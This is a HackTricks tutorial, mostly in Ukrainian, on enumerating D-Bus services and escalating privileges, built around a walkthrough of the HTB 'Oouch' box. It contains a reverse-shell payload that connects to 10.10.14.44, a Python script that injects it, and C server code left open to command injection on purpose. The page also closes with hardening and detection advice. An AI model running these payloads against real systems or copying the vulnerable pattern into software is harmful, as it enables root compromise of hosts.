# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus використовується як посередник міжпроцесної комунікації (IPC) в desktop-середовищах Ubuntu. В Ubuntu спостерігається одночасна робота кількох message buses: system bus, який переважно використовують **privileged services для надання сервісів, релевантних для всієї системи**, і session bus для кожного користувача, який увійшов у систему, що надає сервіси, релевантні лише для цього конкретного користувача. Тут основна увага приділяється system bus через його зв’язок із сервісами, що працюють з вищими privileges (наприклад, root), оскільки наша мета — підвищити privileges. Варто зазначити, що архітектура D-Bus використовує 'router' для кожного session bus, який відповідає за перенаправлення повідомлень клієнтів до відповідних сервісів на основі адреси, вказаної клієнтами для сервісу, з яким вони хочуть взаємодіяти.

Сервіси в D-Bus визначаються **objects** і **interfaces**, які вони надають. Objects можна порівняти з екземплярами класів у стандартних OOP мовах, де кожен екземпляр унікально ідентифікується за допомогою **object path**. Цей шлях, подібно до шляху файлової системи, унікально ідентифікує кожен object, який надає сервіс. Ключовий interface для дослідження — **org.freedesktop.DBus.Introspectable** interface, який має єдиний method, Introspect. Цей method повертає XML-представлення supported methods, signals та properties object'a, але тут акцент зроблено на methods, без розгляду properties і signals.

Для взаємодії з D-Bus interface було використано два tools: CLI tool **gdbus** для зручного виклику methods, exposed by D-Bus, у scripts, і [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), Python-based GUI tool, призначений для enumeration services, available on each bus, та відображення objects, що містяться в кожному service.
```bash
sudo apt-get install d-feet
```
If you are checking the **session bus**, confirm the current address first:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

У першому зображенні показано сервіси, зареєстровані в D-Bus system bus, причому **org.debin.apt** спеціально виділено після вибору кнопки System Bus. D-Feet запитує цей сервіс щодо objects, відображаючи interfaces, methods, properties і signals для вибраних objects, що видно на другому зображенні. Також детально показано signature кожного method.

Помітна особливість — відображення **process ID (pid)** і **command line** сервісу, що корисно для перевірки, чи працює сервіс з підвищеними привілеями, що важливо для релевантності дослідження.

**D-Feet також дозволяє виклик methods**: користувачі можуть вводити Python expressions як parameters, які D-Feet перетворює на D-Bus types перед передачею сервісу.

Однак зверніть увагу, що **деякі methods вимагають authentication** перед тим, як дозволити нам їх викликати. Ми проігноруємо ці methods, оскільки наша мета — підвищити наші привілеї без credentials з самого початку.

Також зверніть увагу, що деякі сервіси запитують інший D-Bus сервіс під назвою org.freedeskto.PolicyKit1, чи слід дозволяти користувачу виконувати певні actions чи ні.

## **Cmd line Enumeration**

### List Service Objects

Можна перелічити відкриті D-Bus interfaces за допомогою:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Сервіси, позначені як **`(activatable)`**, особливо цікаві, тому що вони **ще не запущені**, але запит до bus може запустити їх на вимогу. Не зупиняйтеся на `busctl list`; зіставте ці імена з фактичними бінарними файлами, які вони виконуватимуть.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Це швидко показує, який шлях `Exec=` буде запущено для activatable name і під якою identity. Якщо binary або його execution chain захищені слабко, inactive service все одно може стати шляхом для privilege-escalation.

#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Коли process встановлює connection до bus, bus призначає цьому connection special bus name, який називається _unique connection name_. Bus names цього типу immutable — гарантовано, що вони не зміняться, доки connection існує — і, що важливіше, їх не можна reuse протягом lifetime bus. Це означає, що жоден інший connection до цього bus ніколи не отримає такий unique connection name, навіть якщо той самий process закриє connection до bus і створить новий. Unique connection names легко впізнати, тому що вони починаються з — інакше forbidden — символу двокрапки.

### Service Object Info

Потім ви можете отримати деяку інформацію про interface за допомогою:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Також зіставте назву bus з його `systemd` unit і шляхом до executable:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Це відповідає на операційне запитання, яке має значення під час privesc: **якщо виклик методу успішний, який реальний binary та unit виконає дію?**

### List Interfaces of a Service Object

Вам потрібно мати достатньо permissions.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Інтроспект Interface об’єкта Service

Зверніть увагу, що в цьому прикладі було вибрано останній виявлений interface за допомогою параметра `tree` (_див. попередній розділ_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Зверніть увагу на метод `.Block` інтерфейсу `htb.oouch.Block` (той, що нас цікавить). `s` в інших колонках може означати, що він очікує рядок.

Перш ніж пробувати щось небезпечне, спочатку перевірте **read-oriented** або інший низькоризиковий метод. Це чітко розділяє три випадки: неправильний синтаксис, доступний, але відхилений, або доступний і дозволений.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Корелюйте D-Bus Methods з Policies та Actions

Introspection показує вам **що** ви можете викликати, але не показує **чому** виклик дозволено або заборонено. Для реального privesc triage зазвичай потрібно перевіряти **три шари разом**:

1. **Activation metadata** (`.service` файли або `SystemdService=`), щоб дізнатися, який binary і unit фактично буде запущено.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`), щоб дізнатися, хто може `own`, `send_destination` або `receive_sender`.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`), щоб дізнатися модель авторизації за замовчуванням (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Корисні команди:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Не припускайте **1:1** відповідності між методом **D-Bus** і дією **Polkit**. Той самий метод може обирати іншу дію залежно від об’єкта, що змінюється, або від runtime context. Тому практичний workflow такий:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` і grep відповідних `.policy` файлів
3. low-risk live probes за допомогою `busctl call`, `gdbus call`, або `dbusmap --enable-probes --null-agent`

Proxy або compatibility services заслуговують на особливу увагу. **root-running proxy**, який пересилає запити до іншого D-Bus service через власне заздалегідь встановлене connection, може випадково змусити backend трактувати кожен запит так, ніби він походить від UID 0, якщо identity початкового caller не перевіряється повторно.

### Monitor/Capture Interface

З достатніми привілеями (одних лише привілеїв `send_destination` і `receive_sender` недостатньо) ви можете **monitor** D-Bus communication.

Щоб **monitor** **communication**, вам потрібно бути **root.** Якщо навіть будучи root ви все ще бачите проблеми, перегляньте [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) і [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Якщо ви знаєте, як налаштувати D-Bus config file, щоб **allow non root users to sniff** communication, будь ласка, **contact me**!

Different ways to monitor:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
У наступному прикладі інтерфейс `htb.oouch.Block` моніториться, і **повідомлення "**_**lalalalal**_**" надсилається через miscommunication**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Можна використати `capture` замість `monitor`, щоб зберегти результати у файлі **pcapng**, який може відкрити Wireshark:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Фільтрація всього шуму <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Якщо на bus занадто багато інформації, передайте match rule ось так:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Можна вказати кілька правил. Якщо повідомлення відповідає _будь-якому_ з правил, повідомлення буде виведено. Ось так:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Дивіться [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) для отримання додаткової інформації про синтаксис match rule.

### More

`busctl` має ще більше опцій, [**знайдіть усі з них тут**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

Як користувач **qtc всередині host "oouch" з HTB** ви можете знайти **unexpected D-Bus config file**, розташований у _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Note from the previous configuration that **you will need to be the user `root` or `www-data` to send and receive information** via this D-BUS communication.

Як користувач **qtc** всередині docker container **aeb4525789d8** ви можете знайти деякий dbus-related code у файлі _/code/oouch/routes.py._ Це цікавий код:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Як ви можете бачити, він **підключається до D-Bus interface** і надсилає до функції **"Block"** значення "client_ip".

На іншому боці D-Bus connection працює деякий скомпільований C binary. Цей код **listening** у D-Bus connection **for IP address and is calling iptables via `system` function** щоб заблокувати вказану IP address.\
**The call to `system` is vulnerable on purpose to command injection**, тож payload на кшталт наведеного нижче створить reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Наприкінці цієї сторінки ви можете знайти **complete C code of the D-Bus application**. Усередині нього ви можете знайти між рядками 91-97 **how the `D-Bus object path`** **and `interface name`** **are** **registered**. Ця інформація знадобиться, щоб надіслати інформацію до D-Bus connection:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Також, у рядку 57 ви можете знайти, що **єдиний зареєстрований метод** для цього D-Bus communication називається `Block`(_**Саме тому в наступному розділі payloads будуть надіслані до service object `htb.oouch.Block`, interface `/htb/oouch/Block` і method name `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Наведений нижче python code надішле payload до D-Bus connection до `Block` method через `block_iface.Block(runme)` (_note that it was extracted from the previous chunk of code_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl and dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` — це інструмент, який використовується для надсилання message до “Message Bus”
- Message Bus – Програмне забезпечення, яке системи використовують, щоб легко забезпечувати комунікацію між applications. Воно пов’язане з Message Queue (messages упорядковані в послідовності), але в Message Bus messages надсилаються в моделі subscription і також дуже швидко.
- Тег “-system” використовується, щоб вказати, що це system message, а не session message (за замовчуванням).
- Тег “–print-reply” використовується, щоб коректно вивести наше message і отримати будь-які replies у human-readable форматі.
- “–dest=Dbus-Interface-Block” Адреса Dbus interface.
- “–string:” – Тип message, який ми хочемо надіслати до interface. Існує кілька форматів надсилання messages, наприклад double, bytes, booleans, int, objpath. З них “object path” корисний, коли ми хочемо надіслати path файла до Dbus interface. У цьому випадку ми можемо використати спеціальний файл (FIFO), щоб передати command до interface під виглядом file. “string:;” – Це потрібно, щоб знову викликати object path, де ми розміщуємо FIFO reverse shell file/command.

_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Автоматизовані Helpers для Enumeration (2023-2025)

Enumeration великої D-Bus attack surface вручну за допомогою `busctl`/`gdbus` швидко стає виснажливим. Дві невеликі FOSS утиліти, випущені за останні кілька років, можуть пришвидшити роботу під час red-team або CTF:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* Written in C; single static binary (<50 kB), що проходить по кожному object path, отримує `Introspect` XML і мапить його до PID/UID власника.
* Корисні flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Tool позначає незахищені well-known names символом `!`, миттєво показуючи services, які ви можете *own* (take over), або method calls, доступні з непривілейованого shell.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Python-only script, що шукає *writable* paths у systemd units **та** надто permissive D-Bus policy files (наприклад, `send_destination="*"`).
* Швидке використання:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module searches the directories below and highlights any service that can be spoofed or hijacked by a normal user:
* `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Помітні D-Bus Privilege-Escalation Bugs (2024-2025)

Слідкування за нещодавно опублікованими CVE допомагає знаходити схожі insecure patterns у custom code. Два хороші недавні приклади:

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Service, що працював як root, exposed D-Bus interface, який непривілейовані користувачі могли reconfigure, включно з loading attacker-controlled macro behavior. | If a daemon exposes **device/profile/config management** on the system bus, treat writable configuration and macro features as code-execution primitives, not just "settings". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | A root-running compatibility proxy forwarded requests to backend services without preserving the original caller's security context, so backends trusted the proxy as UID 0. | Treat **proxy / bridge / compatibility** D-Bus services as a separate bug class: if they relay privileged calls, verify how caller UID/Polkit context reaches the backend. |

Patterns to notice:
1. Service runs **as root on the system bus**.
2. Either there is **no authorization check**, or the check is performed against the **wrong subject**.
3. The reachable method eventually changes system state: package install, user/group changes, bootloader config, device profile updates, file writes, or direct command execution.

Use `dbusmap --enable-probes` or manual `busctl call` to confirm whether a method is reachable, then inspect the service's policy XML and Polkit actions to understand **which subject** is actually being authorized.

---

## Hardening & Detection Quick-Wins

* Search for world-writable or *send/receive*-open policies:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Require Polkit for dangerous methods – even *root* proxies should pass the *caller* PID to `polkit_authority_check_authorization_sync()` instead of their own.
* Drop privileges in long-running helpers (use `sd_pid_get_owner_uid()` to switch namespaces after connecting to the bus).
* If you cannot remove a service, at least *scope* it to a dedicated Unix group and restrict access in its XML policy.
* Blue-team: capture the system bus with `busctl capture > /var/log/dbus_$(date +%F).pcapng` and import it into Wireshark for anomaly detection.

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
